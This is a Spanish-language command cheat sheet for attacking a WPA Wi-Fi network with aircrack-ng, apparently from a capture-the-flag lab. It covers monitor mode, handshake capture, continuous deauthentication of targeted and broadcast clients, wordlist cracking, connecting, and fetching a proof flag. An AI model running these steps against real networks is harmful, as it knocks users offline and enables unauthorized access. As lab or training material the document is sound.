### 1. Matar procesos activos
    sudo airmon-ng check kill
### 2. Iniciar modo monitor
    sudo airmon-ng start wlan0
### 3. Iniciar el proceso de captura y monitorización
    sudo airodump-ng wlan0mon
### 4. Iniciar captura y monitoreo de una red específica
    sudo airodump-ng -c 2 -w Captura --essid nombre_red wlan0mon
### 5. Desautenticación en redes Wi-Fi
```
sudo aireplay-ng -0 0 -a F0:9F:C2:71:22:1A -c 64:32:A8:07:6C:40 wlan0mon
```
**aireplay-ng:** Es la herramienta de la suite Aircrack-ng diseñada para inyectar paquetes en una red Wi-Fi, lo que permite realizar una variedad de ataques.
**-0:** Especifica el tipo de ataque a realizar, en este caso, un ataque de desautenticación. El número 0 después de -0 indica este tipo de ataque.
**0:** La cantidad de paquetes de desautenticación a enviar. Un valor de 0 indica que aireplay-ng enviará paquetes de desautenticación de manera continua hasta que el proceso sea detenido manualmente por el usuario.
**-a F0:9F:C2:71:22:1A:** La dirección MAC del punto de acceso (AP) objetivo. -a especifica la dirección MAC del AP al que el dispositivo cliente está conectado o intenta conectarse.
**-c 64:32:A8:07:6C:40:** La dirección MAC del dispositivo cliente (estación) objetivo. -c se utiliza para especificar la dirección MAC del cliente que queremos desautenticar de la red. Si este parámetro se omite, el ataque se dirigirá a todos los dispositivos conectados al AP especificado.
**wlan0mon:** El nombre de la interfaz de red inalámbrica que está en modo monitor y será utilizada para realizar el ataque.
```
sudo aireplay-ng -0 0 -e nombre_red -c FF:FF:FF:FF:FF:FF wlan0mon
```
### 6. Crackeando la red
    sudo aircrack-ng -w /usr/share/john/password.lst Captura-01.cap
### 7. Detener modo monitor
sudo airmon-ng stop wlan0mon
### 8. Ver redes
    sudo iw wlan0 scan
### 9. Creando archivo para conexión
    sudo wpa_passphrase "nombre_red" >> ritesh.conf password
### 10. Ver archivo
    cat ritesh.conf
### 11. Conectando a la red
```
sudo wpa_supplicant -D wext -i wlan0 -c ritesh.conf
```
```
sudo dhclient wlan0
```
```
sudo ifconfig wlan0
```
### 18. Bandera
    curl http://<IP>/proof.txt
